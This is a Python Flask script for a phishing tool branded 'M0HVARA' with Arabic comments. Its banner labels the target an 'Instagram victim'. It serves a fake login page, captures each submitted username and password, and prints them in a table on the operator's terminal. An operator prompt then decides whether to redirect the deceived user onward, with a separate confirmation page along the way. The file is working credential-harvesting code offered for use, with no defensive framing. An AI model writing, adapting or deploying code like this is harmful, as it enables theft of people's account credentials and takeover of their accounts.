from flask import Flask, request, redirect, render_template
import urllib.parse
from colorama import Fore, Style, init
from art import text2art
import logging
import os
import threading
import time

# تهيئة colorama
init(autoreset=True)

def clear_screen():
    """مسح الشاشة"""
    os.system('cls' if os.name == 'nt' else 'clear')

def print_intro(custom_text=None):
    """طباعة مقدمة الأداة"""
    clear_screen()
    print(Fore.GREEN + Style.BRIGHT + text2art("M0HVARA", font='slant'))
    print(Fore.LIGHTYELLOW_EX + "=" * 80)
    print(Fore.LIGHTYELLOW_EX + "| " + "Codec By M0HVARA === www.facebook.com/mohvara".center(76) + " |")
    print(Fore.LIGHTYELLOW_EX + "=" * 80)
    print(" ")
    # استخدام النص المخصص أو النص الافتراضي
    text = custom_text if custom_text else "INSTGRAME VICTIM!"
    print(Fore.RED + Style.BRIGHT + "\u2554" + "\u2550" * 77 + "\u2557")
    print(Fore.RED + Style.BRIGHT + "\u2551" + f' {text} '.center(77) + "\u2551")
    print(Fore.RED + Style.BRIGHT + "\u255A" + "\u2550" * 77 + "\u255D")
    print("\n")

def generate_login_table(entries):
    """إنشاء نص لعرض تفاصيل تسجيل الدخول في جدول"""
    table = Fore.GREEN + Style.BRIGHT + "\n" + "\u2554" + "\u2550" * 50 + "\u2557" + "\n"
    table += Fore.GREEN + Style.BRIGHT + "\u2551" + " Username".ljust(24) + "\u2502" + " Password".ljust(24) + "\u2551" + "\n"
    table += Fore.GREEN + Style.BRIGHT + "\u251C" + "\u2500" * 24 + "\u253C" + "\u2500" * 24 + "\u2524" + "\n"
    
    for entry in entries:
        username, password = entry
        table += Fore.GREEN + Style.BRIGHT + "\u2551" + f' {username}'.ljust(24) + "\u2502" + f' {password}'.ljust(24) + "\u2551" + "\n"
    
    table += Fore.GREEN + Style.BRIGHT + "\u255A" + "\u2550" * 24 + "\u2534" + "\u2550" * 24 + "\u255D" + "\n"
    return table

def show_waiting_message(stop_event):
    """عرض رسالة الانتظار المتحركة"""
    symbols = ['/', '-', '\\', '|']
    while not stop_event.is_set():
        for symbol in symbols:
            print(Fore.CYAN + Style.BRIGHT + "Waiting for user information... " + symbol, end='\r', flush=True)
            time.sleep(0.2)

    print(' ' * 80, end='\r', flush=True)

app = Flask(__name__)

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

redirect_url = None
waiting_message_event = threading.Event()
waiting_thread = threading.Thread(target=show_waiting_message, args=(waiting_message_event,))

login_entries = []  # قائمة لتخزين تفاصيل تسجيل الدخول

def request_url():
    global redirect_url
    if not redirect_url:
        print_intro("INSTGRAME VICTIM!")
        redirect_url = input(Fore.CYAN + "Enter the URL to redirect to after login: " + Style.RESET_ALL).strip()
        clear_screen()
        print(Fore.BLUE + "Link added\n")
        print_intro("INFORMATION VICTIM!")  # عرض الجملة بعد إدخال الرابط

@app.route('/')
def index():
    # عرض تفاصيل تسجيل الدخول السابقة في الجدول عند فتح الصفحة
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')

    if waiting_thread.is_alive():
        waiting_message_event.set()
        waiting_thread.join()

    login_entries.append((username, password))  # إضافة تفاصيل تسجيل الدخول إلى القائمة
    clear_screen()
    print_intro("INFORMATION VICTIM!")

    # عرض الجدول مع تفاصيل تسجيل الدخول الجديدة
    table = generate_login_table(login_entries)
    print(table)  # عرض الجدول في الطرفية

    return render_template('auth_confirmation.html')

@app.route('/confirm_auth', methods=['POST'])
def confirm_auth():
    global redirect_url
    user_input = input(Fore.CYAN + "\nDo you want to redirect the user to the entered URL? (Y/N): " + Style.RESET_ALL).strip().upper()
    
    if user_input == 'Y':
        if redirect_url:
            encoded_url = urllib.parse.unquote(redirect_url)
            print(Fore.GREEN + f"Redirecting to {encoded_url}...")
            return redirect(encoded_url)
        else:
            print(Fore.RED + "Redirect URL not specified.")
            return "Redirect URL not specified."
    elif user_input == 'N':
        print(Fore.RED + "Redirection denied.")
        return "Redirection denied by the admin."
    else:
        print(Fore.RED + "Invalid input. Please enter Y or N.")
        return redirect('/confirm_auth')  # إعادة عرض صفحة المصادقة

if __name__ == '__main__':
    request_url()
    app.run()
